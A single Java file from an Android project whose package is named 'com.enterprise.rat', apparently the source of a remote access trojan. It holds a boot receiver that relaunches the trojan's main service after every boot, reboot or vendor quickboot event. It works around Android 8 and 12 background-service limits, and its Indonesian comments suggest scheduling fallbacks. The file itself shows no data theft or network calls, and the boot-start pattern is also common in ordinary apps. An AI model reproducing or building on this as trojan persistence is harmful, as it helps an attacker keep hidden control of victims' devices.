package com.enterprise.rat;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import com.enterprise.rat.services.MainService;

public class BootReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        String action = intent.getAction();
        if (action != null && (action.equals(Intent.ACTION_BOOT_COMPLETED) ||
            action.equals("android.intent.action.QUICKBOOT_POWERON") ||
            action.equals("com.htc.intent.action.QUICKBOOT_POWERON") ||
            action.equals(Intent.ACTION_REBOOT))) {

            Intent serviceIntent = new Intent(context, MainService.class);
            // Android 12+ tidak mengizinkan startForegroundService dari background
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                try {
                    context.startService(serviceIntent);
                } catch (Exception e) {
                    // fallback: jadwalkan lewat WorkManager atau AlarmManager
                }
            } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(serviceIntent);
            } else {
                context.startService(serviceIntent);
            }
        }
    }
}
